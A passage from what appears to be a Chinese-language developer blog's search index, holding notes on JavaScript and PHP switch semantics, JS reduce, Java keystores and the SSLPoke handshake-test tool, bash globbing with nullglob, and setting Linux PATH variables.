href=\"https://stackoverflow.com/questions/10722110/overriding-member-variables-in-java\" target=\"_blank\" rel=\"noopener\">override - Overriding member variables in Java - Stack Overflow</a></li>\n<li><a href=\"http://www.codedata.com.tw/book/java-basic-source/ch11-3.htm\" target=\"_blank\" rel=\"noopener\">JAVA</a></li>\n<li><a href=\"http://miggo.pixnet.net/blog/post/30799978-%5Bphp%E8%A7%80%E5%BF%B5%5Dself%E5%92%8C%24this%E7%9A%84%E5%B7%AE%E7%95%B0\" target=\"_blank\" rel=\"noopener\">[PHP 觀念]self 和\\$this 的差異 @ 麥克的學習紀錄 :: 痞客邦 ::</a></li>\n</ul>\n","categories":["寫程式一些事"],"tags":["php","java","JavaScript","class"]},{"title":"js,php的switch差異","url":"/blog/2019/03/26/js-php%E7%9A%84switch%E5%B7%AE%E7%95%B0/","content":"<p>最近 JS 有一個 bug<br>發現 bug 是在 switch<br>我是字串跟數字去做比對<br>就發現 js 不會批對到我想要的(跑去 default:去)<br>趕快來筆記!!</p>\n<a id=\"more\"></a>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">switch</span> (<span class=\"string\">\"1\"</span>) &#123;</span><br><span class=\"line\">  <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"1\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">  <span class=\"keyword\">case</span> <span class=\"string\">\"1\"</span>:</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"2\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>Ans: 2</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">switch</span>(<span class=\"string\">'1'</span>)&#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'1'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"string\">'1'</span>:</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">'2'</span>;</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>Ans: 1</p>\n<p>Google 找了一下 JS 的 switch</p>\n<blockquote>\n<p>Description<br>Section<br>A switch statement first evaluates its expression. It then looks for the first case clause whose expression evaluates to the same value as the result of the input expression (using the strict comparison, ===) and transfers control to that clause, executing the associated statements. (If multiple cases match the provided value, the first case that matches is selected, even if the cases are not equal to each other.)</p>\n</blockquote>\n<p>裡面有提到他是用 switch 試用<strong>三個等於</strong><code>===</code></p>\n<p>PHP 是用兩個等於，可以看官網文件<a href=\"https://www.php.net/manual/en/control-structures.switch.php\" target=\"_blank\" rel=\"noopener\">PHP: switch - Manual</a></p>\n","categories":["JavaScript"],"tags":["php","js","switch"]},{"title":"js做物件reduce運算技巧(map,reduce)","url":"/blog/2019/03/13/js%E5%81%9A%E7%89%A9%E4%BB%B6reduce%E9%81%8B%E7%AE%97%E6%8A%80%E5%B7%A7-map-reduce/","content":"<p>最近想用 js 去做運算<br>發現使用 reduce 做物件院算發生問題<br>有爬文找到方法<br>這邊簡單做紀錄</p>\n<a id=\"more\"></a>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">this</span>.filterData..reduce( <span class=\"function\">(<span class=\"params\">a , b </span>)=&gt;</span> <span class=\"built_in\">Number</span>(a.total) + <span class=\"built_in\">Number</span>(b.total) ).toFixed(<span class=\"number\">4</span>);</span><br></pre></td></tr></table></figure>\n<p>當初沒有仔細看 reduce 文件<br>當第一次進去 reduce 代的參數都會帶入 1,2 位置<br>第一圈可能會沒問題，但是第二圈<code>a</code>不是物件，是第一圈 return 的值<br>所以程式都會有問題<br>改要怎麼解決這個問題<br>有找到兩個解法</p>\n<p><a href=\"https://stackoverflow.com/questions/5732043/javascript-reduce-on-array-of-objects\" target=\"_blank\" rel=\"noopener\">functional programming - Javascript reduce on array of objects - Stack Overflow</a><br><a href=\"http://fred-zone.blogspot.com/2017/01/javascript-mapreduce.html\" target=\"_blank\" rel=\"noopener\">上手使用 JavaScript 的 Map、Reduce 吧！</a></p>\n<p>reduce 第二個參數，是 intial value，放入的時候第一個<code>a</code>會代 <code>0</code>進去<br>所以後面不會錯<br>另一個方法是用 map 來整理資料，在做 reduce<br>第二種會比較舒服</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">this</span>.filterData</span><br><span class=\"line\">  .map(<span class=\"function\"><span class=\"params\">v</span> =&gt;</span> <span class=\"built_in\">Number</span>(v.total))</span><br><span class=\"line\">  .reduce(<span class=\"function\">(<span class=\"params\">a, b</span>) =&gt;</span> a + b)</span><br><span class=\"line\">  .toFixed(<span class=\"number\">4</span>);</span><br><span class=\"line\"><span class=\"keyword\">this</span>.filterData.reduce(<span class=\"function\">(<span class=\"params\">a, &#123; total &#125;</span>) =&gt;</span> a + +total, <span class=\"number\">0</span>).toFixed(<span class=\"number\">4</span>);</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://jser.me/2014/04/02/%E5%A6%82%E4%BD%95%E5%9C%A8Array.forEach%E7%9A%84%E5%BE%AA%E7%8E%AF%E9%87%8Cbreak.html\" target=\"_blank\" rel=\"noopener\">如何在 Array.forEach 的循环里 break</a></p>\n<p><a href=\"https://www.zhihu.com/question/34183746\" target=\"_blank\" rel=\"noopener\">js 中<strong>proto</strong>和 prototype 的区别和关系？ - 知乎</a></p>\n"},{"title":"keystore 小記","url":"/blog/2020/07/28/keystore-%E5%B0%8F%E8%A8%98/","content":"<p>最近研究憑證，知道 Java 管理憑證機制是用自己的<br>keystore 這個是 Java 用的憑證<br>本篇不實作，簡單整理網路上的資訊</p>\n<a id=\"more\"></a>\n<h2 id=\"什麼是-keystore\"><a href=\"#什麼是-keystore\" class=\"headerlink\" title=\"什麼是 keystore\"></a>什麼是 keystore</h2><blockquote>\n<p>Keytool是Java證書的管理工具，Keytool將金鑰（key）、證書（certificates）存在一個keystore的檔案裡</p>\n</blockquote>\n<p><a href=\"https://cms.35g.tw/coding/keystore-check-password/\" target=\"_blank\" rel=\"noopener\">利用keystore 指令來確認憑證密碼 - 可丁丹尼 @ 一路往前走2.0</a></p>\n<h2 id=\"jssecacerts\"><a href=\"#jssecacerts\" class=\"headerlink\" title=\"jssecacerts\"></a>jssecacerts</h2><blockquote>\n<p>JSSE簡介</p>\n<p>Java安全套接擴展 (Java Secure Socket Extension, JSSE)是實現Internet安全通信的一系列包的集合。它是一個&gt;SSL和TLS的純Java實現，可以透明地提供數據加密、服務器認證、信息完整性等功能，可以使我們像使用普通的套接字一樣使&gt;用JSSE建立的安全套接字。JSSE是一個開放的標準，不只是Sun公司才能實現一個JSSE，事實上其他公司有自己實現的JSSE。</p>\n<p>在深入瞭解JSSE之前，需要瞭解一個有關Java安全的概念：客戶端TrustStore文件。客戶端的TrustStore文件中保存著被客戶端所信任的服務器證書信息，客戶端在嘗試進行SSL連接時，JSSE將根據這個文件中的證書是否決定信任服務端的證書。</p>\n<p>JSSE中有一個信任管理器負責決定是否信任遠程服務器的證書，該類有如下處理原則：</p>\n<p>   如果該系統屬性javax.net.sll.trustStore指定了TrustStore文件，那麼信任管理器就去jre安裝路徑下的lib/security/目錄中尋找並使用這個文件來檢查證書。如果該系統沒有指定TrustStore文件，它就會去jre安裝路徑下尋找默認的TrustStore文件，這個文件的相對路徑為：lib/security/jssecacerts。如果jssecacerts不存在，但是cacerts存在(它隨J2SDK一起發行，含有數量有限的可信任的基本證書)，那麼這個默認的TrustStore文件就是cacerts。Java提供了一種非常簡潔的方法來訪問HTTPS網頁，即使用類HttpsURLConnection、URL等。這些類為支持HTTPS對JSSE相關類做了一些封裝。 </p>\n</blockquote>\n<p><a href=\"https://zhuanlan.zhihu.com/p/75456673\" target=\"_blank\" rel=\"noopener\">用Java實現HTTPS工作原理（二） - 知乎</a></p>\n<p>最近專案看到 jssecacerts<br>從這個上面我猜測是管理根憑證東西<br>Java 預設是沒有加入根憑證的，所以沒辦法使用。</p>\n<p>要怎麼測試憑證 Java 吃的到?<br><a href=\"https://malagege.github.io/blog/2020/06/25/Java-%E5%9B%A0%E6%86%91%E8%AD%89-SNI-%E5%95%8F%E9%A1%8C%E9%A9%97%E8%AD%89%E4%B8%8D%E9%81%8E/\">Java 因憑證 SNI 問題驗證不過 | 程式狂想筆記</a><br>這篇有講到檢查憑證方法<br>可以指定根憑證檢查檔案<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -Djavax.net.ssl.trustStore=/path.../jssecacerts  -jar java-keystore-test-0.1.0.jar  https://xxx.twca.domain</span><br></pre></td></tr></table></figure></p>\n<p>檢查也有找到這個方法可用<a href=\"https://dotblogs.com.tw/grayyin/2018/07/12/145718\" target=\"_blank\" rel=\"noopener\">[JAVA] SSL handshake連線測試工具 SSLPoke | 阿輝的零碎筆記 - 點部落</a></p>\n<p>SSLPoke.java<br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.PrintStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.net.ssl.SSLHandshakeException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.net.ssl.SSLSocket;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SSLPoke</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">SSLPoke</span><span class=\"params\">()</span> </span>&#123;&#125;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] paramArrayOfString)</span></span></span><br><span class=\"line\"><span class=\"function\">  </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (paramArrayOfString.length != <span class=\"number\">2</span>) &#123;</span><br><span class=\"line\">      System.err.println(<span class=\"string\">\"Utility to debug Java connections to SSL servers\"</span>);</span><br><span class=\"line\">      System.err.println(<span class=\"string\">\"Usage: \"</span>);</span><br><span class=\"line\">      System.err.println(<span class=\"string\">\"  java \"</span> + SSLPoke.class.getName() + <span class=\"string\">\" &lt;host&gt; &lt;port&gt;\"</span>);</span><br><span class=\"line\">      System.err.println(<span class=\"string\">\"or for more debugging:\"</span>);</span><br><span class=\"line\">      System.err.println(<span class=\"string\">\"  java -Djavax.net.debug=ssl \"</span> + SSLPoke.class.getName() + <span class=\"string\">\" &lt;host&gt; &lt;port&gt;\"</span>);</span><br><span class=\"line\">      System.err.println();</span><br><span class=\"line\">      System.err.println(<span class=\"string\">\"Eg. to test the SSL certificate at https://localhost, use\"</span>);</span><br><span class=\"line\">      System.err.println(<span class=\"string\">\"  java \"</span> + SSLPoke.class.getName() + <span class=\"string\">\" localhost 443\"</span>);</span><br><span class=\"line\">      System.exit(<span class=\"number\">1</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">      SSLSocketFactory localSSLSocketFactory = (SSLSocketFactory)SSLSocketFactory.getDefault();</span><br><span class=\"line\">      SSLSocket localSSLSocket = (SSLSocket)localSSLSocketFactory.createSocket(paramArrayOfString[<span class=\"number\">0</span>], Integer.parseInt(paramArrayOfString[<span class=\"number\">1</span>]));</span><br><span class=\"line\">      </span><br><span class=\"line\">      java.io.InputStream localInputStream = localSSLSocket.getInputStream();</span><br><span class=\"line\">      java.io.OutputStream localOutputStream = localSSLSocket.getOutputStream();</span><br><span class=\"line\">      </span><br><span class=\"line\"></span><br><span class=\"line\">      localOutputStream.write(<span class=\"number\">1</span>);</span><br><span class=\"line\">      </span><br><span class=\"line\">      <span class=\"keyword\">while</span> (localInputStream.available() &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        System.out.print(localInputStream.read());</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">      System.out.println(<span class=\"string\">\"Successfully connected\"</span>);</span><br><span class=\"line\">      System.exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">catch</span> (SSLHandshakeException localSSLHandshakeException) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (localSSLHandshakeException.getCause() != <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">        localSSLHandshakeException.getCause().printStackTrace();</span><br><span class=\"line\">      &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        localSSLHandshakeException.printStackTrace();</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">catch</span> (Exception localException) &#123;</span><br><span class=\"line\">      localException.printStackTrace();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    System.exit(<span class=\"number\">1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">## 先打包成class</span><br><span class=\"line\">$ javac SSLPoke.java</span><br><span class=\"line\">$ java SSLPoke www.google.com 443</span><br></pre></td></tr></table></figure>\n<p>連線成功會顯示<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ java SSLPoke www.google.com 443</span><br><span class=\"line\">Successfully connected</span><br></pre></td></tr></table></figure></p>\n<p>失敗就會出現一大堆錯</p>\n<p>看根憑證</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># 查詢keystore的內容</span><br><span class=\"line\">      keytool –list –v –keystore .keystore</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://dotblogs.com.tw/grayyin/2019/05/04/143637\" target=\"_blank\" rel=\"noopener\">Java keytool 基本指令 | 阿輝的零碎筆記 - 點部落</a></p>\n<p>加入 TWCA 根憑證</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">keytool -importcert -file <span class=\"string\">\"twca root ca.cer\"</span>  -keystore jssecacerts</span><br></pre></td></tr></table></figure>\n<p>jssecacerts 是放憑證<br>Java 存放憑證路徑</p>\n<p>C:\\Program Files\\Java\\jdk-13.0.2\\lib\\security</p>\n<p>Linux 待補(有想到的話)，其實也是放在相似地方</p>\n<p>本篇到這邊</p>\n<p>查詢整理</p>\n<ul>\n<li><a href=\"https://dotblogs.com.tw/grayyin/2019/05/04/143637\" target=\"_blank\" rel=\"noopener\">Java keytool 基本指令 | 阿輝的零碎筆記 - 點部落</a></li>\n<li><a href=\"http://polinwei.blogspot.com/2013/02/java-keytoolmicrosoft-active-directory.html\" target=\"_blank\" rel=\"noopener\">我的工作日記: Java Keytool的使用及申請憑證(以Microsoft Active Directory Certificate Services為例)</a></li>\n<li><a href=\"https://sslbuyer.com/index.php?option=com_content&amp;view=article&amp;id=134:keytool-usage&amp;catid=25&amp;Itemid=4031\" target=\"_blank\" rel=\"noopener\">Java Keytool使用方式 - SSL憑證推薦網 | SSL憑證 | code Sign</a></li>\n<li><a href=\"https://ningyu1.github.io/site/post/52-ssl-cert-2/\" target=\"_blank\" rel=\"noopener\">使用自签名证书，简单步骤 - 凝雨 - Yun</a></li>\n<li><a href=\"https://www.ssl.com.tw/Support/title_show.asp?id1=7&amp;id2=1,0&amp;titleid=249\" target=\"_blank\" rel=\"noopener\">利用keytool 匯入CA Root 憑證方式 - 寰宇數位認證中心 - 技術支援 Support</a></li>\n<li><a href=\"https://stackoverflow.com/questions/2138574/java-path-to-truststore-set-property-doesnt-work\" target=\"_blank\" rel=\"noopener\">ssl - java - path to trustStore - set property doesn’t work? - Stack Overflow</a></li>\n<li><a href=\"https://dotblogs.com.tw/grayyin/2018/07/12/145718\" target=\"_blank\" rel=\"noopener\">[JAVA] SSL handshake連線測試工具 SSLPoke | 阿輝的零碎筆記 - 點部落</a></li>\n<li><a href=\"https://matthewdavis111.com/java/poke-ssl-test-java-certs/\" target=\"_blank\" rel=\"noopener\">Use SSL Poke to test Java SSL connection - matthewdavis111</a></li>\n<li><a href=\"https://confluence.atlassian.com/jira/connecting-to-ssl-services-117455.html\" target=\"_blank\" rel=\"noopener\">Connecting to SSL services - Atlassian Documentation</a></li>\n</ul>\n<ul>\n<li><a href=\"https://medium.com/@kentchen_tw/android-studio-keystore-%E5%BB%BA%E7%AB%8B%E8%88%87%E7%AE%A1%E7%90%86-47d4afcc6e61\" target=\"_blank\" rel=\"noopener\">Android Studio：Keystore 建立與管理. 撰文時使用 MAC + Android Studio 2.2RC | by Kent Chen | Medium</a></li>\n<li><a href=\"https://blog.csdn.net/dotuian/article/details/51722300\" target=\"_blank\" rel=\"noopener\">关于keystore的简单介绍_人在旅途-CSDN博客_keystore是什么</a></li>\n<li><a href=\"https://www.jianshu.com/p/644ddb6e3d9c\" target=\"_blank\" rel=\"noopener\">Android Keystore漫谈 - 简书</a></li>\n<li><a href=\"https://www.google.com/search?q=crt+to+keystore&amp;client=firefox-b-d&amp;sxsrf=ALeKk015rMyv_7BJR7XF7bp-HrBvx85Ybg:1595943967876&amp;ei=HywgX8uLNfnUmAXO4yA&amp;start=20&amp;sa=N&amp;ved=2ahUKEwiLl6XKivDqAhV5KqYKHc4xCAA4ChDw0wN6BAgMEEM&amp;biw=1280&amp;bih=644\" target=\"_blank\" rel=\"noopener\">crt to keystore - Google 搜尋</a></li>\n<li><a href=\"https://www.jianshu.com/p/59e2bb2befa9\" target=\"_blank\" rel=\"noopener\">CRT证书转JKS证书 - 簡書</a></li>\n<li><a href=\"https://medium.com/%E5%B7%A5%E7%A8%8B%E5%B8%AB%E6%B1%82%E7%94%9F%E6%8C%87%E5%8D%97-sofware-engineer-survival-guide/%E5%9C%96%E8%A7%A3keystore%E6%9B%B4%E6%96%B0%E6%95%91%E6%8F%B4-55f230db4914\" target=\"_blank\" rel=\"noopener\">Keystore更新重置. 相信可能有人有遺失Keystroe的經驗，因這次筆者拿金鑰去註冊測試Fireba… | by 陳建維 Ben | 工程師求生指南(Sofware Engineer Survival Guide) | Medium</a></li>\n<li><a href=\"http://dh66.blogspot.com/2013/07/ssl.html\" target=\"_blank\" rel=\"noopener\">DH技術筆記: SSL憑證建立</a></li>\n</ul>\n","categories":["Linux"],"tags":["java"]},{"title":"linux bash / shell 有關 * 星號的事情","url":"/blog/2020/01/21/linux-bash-shell-%E6%9C%89%E9%97%9C-%E6%98%9F%E8%99%9F%E7%9A%84%E4%BA%8B%E6%83%85/","content":"<p>以前 <code>ls</code> 萬用字元真的很方便</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ls *.jpg</span><br></pre></td></tr></table></figure>\n<p>這樣可以列出很多 <code>*.jpg</code> 圖片<br>但是有些細節沒有釐清<br>偶爾會遇到不能用的狀況下<br>今天終於徹底了解</p>\n<a id=\"more\"></a>\n<h2 id=\"釐清\"><a href=\"#釐清\" class=\"headerlink\" title=\"釐清 *\"></a>釐清 <code>*</code></h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> *</span><br><span class=\"line\"><span class=\"comment\"># file list...(ex: xxx.jpg ffff.jpg)</span></span><br></pre></td></tr></table></figure>\n<p><strong>就是現在目錄抓到相關檔案名稱</strong><br>這也是為什麼? 原理就這麼簡單<br>但我這邊沒講更細<br>下面 shopt -s nullglob 會提到</p>\n<h2 id=\"shell-array-應用\"><a href=\"#shell-array-應用\" class=\"headerlink\" title=\"shell array 應用\"></a>shell array 應用</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">jpgs=(*.jpg)</span><br></pre></td></tr></table></figure>\n<p>這樣看似可以用<br>但沒有 jpg ，就會產生 *.jpg<br>這邊要小心<br>這邊也是有辦法解決</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">shopt</span> -s nullglob <span class=\"comment\"># bash</span></span><br><span class=\"line\"><span class=\"built_in\">unsetopt</span> nomatch <span class=\"comment\"># zsh</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">files=(xorg-x11-fonts*)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ -e <span class=\"string\">\"<span class=\"variable\">$&#123;files[0]&#125;</span>\"</span> ];</span><br><span class=\"line\"><span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">printf</span> <span class=\"string\">\"BLAH\"</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure>\n<p>參考:<a href=\"https://stackoverflow.com/questions/6363441/check-if-a-file-exists-with-wildcard-in-shell-script/17404812#17404812\" target=\"_blank\" rel=\"noopener\">sh - Check if a file exists with wildcard in shell script - Stack Overflow</a></p>\n<h3 id=\"shopt-s-nullglob\"><a href=\"#shopt-s-nullglob\" class=\"headerlink\" title=\"shopt -s nullglob\"></a>shopt -s nullglob</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">shopt</span> -s nullglob <span class=\"comment\"># enable </span></span><br><span class=\"line\"><span class=\"built_in\">shopt</span> -u nullglob <span class=\"comment\"># disable</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">echo</span> my*file</span><br><span class=\"line\">my*file</span><br><span class=\"line\"><span class=\"built_in\">shopt</span> -s nullglob</span><br><span class=\"line\"><span class=\"built_in\">echo</span> my*file <span class=\"comment\"># 不會印出東西</span></span><br></pre></td></tr></table></figure>\n<p>參考: <a href=\"https://t.codebug.vip/questions-844092.htm\" target=\"_blank\" rel=\"noopener\">linux:以下shell選項的含義是什麼 - shopt -s nullglob \\ textglob - Codebug</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/sh  </span></span><br><span class=\"line\">old=$(<span class=\"built_in\">pwd</span>)  </span><br><span class=\"line\">[ <span class=\"variable\">$#</span> -lt 2 ] &amp;&amp; <span class=\"built_in\">echo</span> -e <span class=\"string\">\"\\t[Info] Give arg1=Folder path; arg2=File extension!\\n\"</span> &amp;&amp; <span class=\"built_in\">exit</span> 1  </span><br><span class=\"line\">[ -d <span class=\"variable\">$1</span> ] &amp;&amp; <span class=\"built_in\">cd</span> <span class=\"variable\">$1</span> || <span class=\"built_in\">exit</span> 2  </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"built_in\">shopt</span> -s nullglob  </span><br><span class=\"line\">found=0  </span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> *.<span class=\"variable\">$2</span>; <span class=\"keyword\">do</span>  </span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"File <span class=\"variable\">$i</span> found\"</span> <span class=\"comment\"># or take other action  </span></span><br><span class=\"line\">    found=1  </span><br><span class=\"line\"><span class=\"keyword\">done</span>  </span><br><span class=\"line\"><span class=\"built_in\">shopt</span> -u nullglob  </span><br><span class=\"line\">[ <span class=\"variable\">$found</span> -eq 0 ] &amp;&amp; <span class=\"built_in\">echo</span> <span class=\"string\">\"Directory is empty\"</span>  </span><br><span class=\"line\"><span class=\"built_in\">cd</span> <span class=\"variable\">$old</span></span><br></pre></td></tr></table></figure>\n<p>// List all file with extension .mp3 under folder ‘empty’<br>./listFE.sh empty mp3<br>File test.mp3 found</p>\n<p>以上參考:<a href=\"http://puremonkey2010.blogspot.com/2016/01/linux-use-bash-nullglob-to-verify-c.html\" target=\"_blank\" rel=\"noopener\">程式扎記: [Linux 文章收集] Use BASH nullglob To Verify *.c Files Exists or Not In a Directory</a></p>\n<p>當然也有別的解決方案</p>\n<h2 id=\"test-f-jpg\"><a href=\"#test-f-jpg\" class=\"headerlink\" title=\"test -f *.jpg\"></a>test -f *.jpg</h2><p>我公司有古早程式這樣寫<br>但會遇到一些問題</p>\n<p>除了上述解決方法</p>\n<p>還有一種是</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">files=$(ls /tmp/*.cache 2&gt; /dev/null | wc -l)</span><br><span class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"string\">\"<span class=\"variable\">$files</span>\"</span> != <span class=\"string\">\"0\"</span> ]</span><br><span class=\"line\"><span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"Cache files exist: do something with them\"</span></span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"No cache files...\"</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"find-方法-多層搜尋方法\"><a href=\"#find-方法-多層搜尋方法\" class=\"headerlink\" title=\"find 方法(多層搜尋方法)\"></a>find 方法(多層搜尋方法)</h2><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">files=$(find /tmp -<span class=\"built_in\">type</span> f -name <span class=\"string\">\"*.cache\"</span> | wc -l)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"string\">\"<span class=\"variable\">$files</span>\"</span> != <span class=\"string\">\"0\"</span> ]</span><br><span class=\"line\"><span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"Cache files exist: do something with them\"</span></span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"No cache files...\"</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure>\n<p>find 搜尋也可以加 or 條件<br>再多個搜尋也是很方便<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">find /tmp -type f -name &quot;*.mpg&quot; -o -name &quot;*.jpg&quot;</span><br></pre></td></tr></table></figure></p>\n<p>更多方法可以看:<a href=\"http://www.ducea.com/2009/03/05/bash-tips-if-e-wildcard-file-check-too-many-arguments/\" target=\"_blank\" rel=\"noopener\">Bash tips: if -e wildcard file check =&gt; [: too many arguments - MDLog:/sysadmin</a></p>\n<p>相關連結:</p>\n<ul>\n<li><a href=\"https://unix.stackexchange.com/questions/378205/use-asterisk-in-variables\" target=\"_blank\" rel=\"noopener\">bash - Use asterisk in variables - Unix &amp; Linux Stack Exchange</a></li>\n<li><a href=\"https://stackoverflow.com/questions/6363441/check-if-a-file-exists-with-wildcard-in-shell-script/17404812#17404812\" target=\"_blank\" rel=\"noopener\">sh - Check if a file exists with wildcard in shell script - Stack Overflow</a></li>\n<li><a href=\"https://phoenixnap.com/kb/how-to-check-if-file-or-directory-exists-bash-shell\" target=\"_blank\" rel=\"noopener\">How to Check / Test if a File or Directory Exists in Bash</a></li>\n<li><a href=\"http://www.ducea.com/2009/03/05/bash-tips-if-e-wildcard-file-check-too-many-arguments/\" target=\"_blank\" rel=\"noopener\">Bash tips: if -e wildcard file check =&gt; [: too many arguments - MDLog:/sysadmin</a></li>\n<li><a href=\"https://blog.hsdn.net/970.html\" target=\"_blank\" rel=\"noopener\">電腦各種符號英文唸法 | 阿維雜記本 (Wei’s Blog)</a></li>\n<li><a href=\"https://stackoverflow.com/questions/25224324/bash-detecting-mp4-files\" target=\"_blank\" rel=\"noopener\">linux - bash, detecting mp4 files - Stack Overflow</a></li>\n<li><a href=\"https://www.codenong.com/10653300/\" target=\"_blank\" rel=\"noopener\">关于bash：确认是否存在一个或多个目录 | 码农家园</a></li>\n</ul>\n","categories":["Linux"],"tags":["bash","shell"]},{"title":"linux 設定環境變數","url":"/blog/2018/08/09/linux-%E8%A8%AD%E5%AE%9A%E7%92%B0%E5%A2%83%E8%AE%8A%E6%95%B8/","content":"<p>最近同事在測試環境玩GO語言<br>他好像在linux沒法執行編譯程式<br><a href=\"https://www.cnblogs.com/oxspirt/p/7072818.html\" target=\"_blank\" rel=\"noopener\">golang 跨平台編譯——go 在windows上編譯Linux平台的程序（Cross Compilation from Windows to Linux/Ubuntu） - 牛頓的小腦 - 博客園</a><br>他是在window編譯完後在linux上面不能跑<br>後來我發現他沒有執行<code>chmod a+x hello</code><br>所以不能執行<br>最後他試著在linux上面放go語言<br>設定環境變數有點況狀<br>當然要趁著這個機會好好了解XD</p>\n<a id=\"more\"></a>\n<p>有設定<code>export PATH=$PATH:/xxx/go/bin</code><br>但是登出後  就會被清除</p>\n<p>來自<a href=\"http://linux.vbird.org/linux_basic/0320bash.php#fig10.2.3\" target=\"_blank\" rel=\"noopener\">鳥哥的 Linux 私房菜 – 第十章、認識與學習BASH</a></p>\n<p>要永久存放參數，可以放在<code>~/bash_profile</code><br>假如要所有人登入能跑的話可以放在<code>/etc/profile</code><br>詳細可參考鳥哥裡面的圖片<a href=\"http://linux.vbird.org/linux_basic/0320bash.php#fig10.4.1\" target=\"_blank\" 